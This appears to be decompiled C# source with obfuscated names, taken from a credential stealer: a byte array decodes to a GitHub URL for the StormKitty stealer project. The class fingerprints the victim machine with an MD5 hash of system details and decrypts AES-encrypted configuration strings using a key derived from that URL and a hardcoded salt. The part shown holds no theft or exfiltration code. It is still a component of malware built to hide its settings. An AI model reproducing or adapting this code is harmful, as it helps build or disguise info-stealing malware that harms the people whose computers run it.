using System;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using ns1;

namespace ns16;

internal sealed class Class78
{
	[Serializable]
	[CompilerGenerated]
	private sealed class Class79
	{
		public static readonly Class79 class79_0 = new Class79();

		public static Func<byte, string> func_0;

		internal string _003CGenerateRandomData_003Eb__4_0(byte ba)
		{
			byte b = ba;
			return b.ToString("x2");
		}
	}

	public static string string_0 = smethod_0();

	private static readonly byte[] byte_0 = new byte[16]
	{
		255, 64, 191, 111, 23, 3, 113, 119, 231, 121,
		252, 112, 79, 32, 114, 156
	};

	private static readonly byte[] byte_1 = new byte[38]
	{
		104, 116, 116, 112, 115, 58, 47, 47, 103, 105,
		116, 104, 117, 98, 46, 99, 111, 109, 47, 76,
		105, 109, 101, 114, 66, 111, 121, 47, 83, 116,
		111, 114, 109, 75, 105, 116, 116, 121
	};

	public static string string_1 = Encoding.UTF8.GetString(byte_1);

	public static string string_2 = smethod_1(new byte[32]
	{
		169, 182, 79, 179, 252, 54, 138, 148, 167, 99,
		216, 216, 199, 219, 10, 249, 131, 166, 170, 145,
		237, 248, 142, 78, 196, 137, 101, 62, 142, 107,
		245, 134
	});

	public static string smethod_0(string string_3 = "0")
	{
		string text = ((!(string_3 == "0")) ? string_3 : new Random().Next(0, 10).ToString());
		string s = text + "-" + Class6.string_0 + "-" + Class6.string_1 + "-" + Class6.string_2 + "-" + Class6.smethod_12() + "-" + Class6.smethod_13();
		using MD5 mD = MD5.Create();
		return string.Join("", mD.ComputeHash(Encoding.UTF8.GetBytes(s)).Select(delegate(byte ba)
		{
			byte b = ba;
			return b.ToString("x2");
		}));
	}

	public static string smethod_1(byte[] byte_2)
	{
		byte[] bytes = null;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, byte_0, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_2, 0, byte_2.Length);
				cryptoStream.Close();
			}
			bytes = memoryStream.ToArray();
		}
		return Encoding.UTF8.GetString(bytes);
	}

	public static string smethod_2(string string_3)
	{
		if (string.IsNullOrEmpty(string_3))
		{
			return "";
		}
		if (!string_3.StartsWith("ENCRYPTED:"))
		{
			return string_3;
		}
		return smethod_1(Convert.FromBase64String(string_3.Replace("ENCRYPTED:", "")));
	}
}
